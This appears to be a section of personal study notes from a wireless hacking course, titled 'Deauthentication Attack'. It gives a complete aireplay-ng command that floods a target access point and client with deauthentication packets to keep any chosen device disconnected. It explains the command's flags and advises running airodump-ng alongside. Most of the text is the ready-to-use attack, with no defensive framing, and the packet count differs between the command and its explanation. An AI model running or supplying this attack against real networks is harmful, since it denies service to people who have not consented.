SECTION 5.17

DEAUTHENTICATION ATTACK
*Disconnect any device from any network
*We will use aireplay-ng for this

aireplay-ng --deauth 10000000 -a <target network's mac address> -c <target device's mac address> wlan0

*deauth- gives an indication that we want to run a deauthentication attack
*1000000- A large number of deauhtentication packets that will be sent to the router and the client so that client stays disconnected




*before running this command it is suggested to have a airodump-ng running in a second terminal window for the target network
*After running this command the client wont be able to reconnect unless you do cntrl+c in the terminal
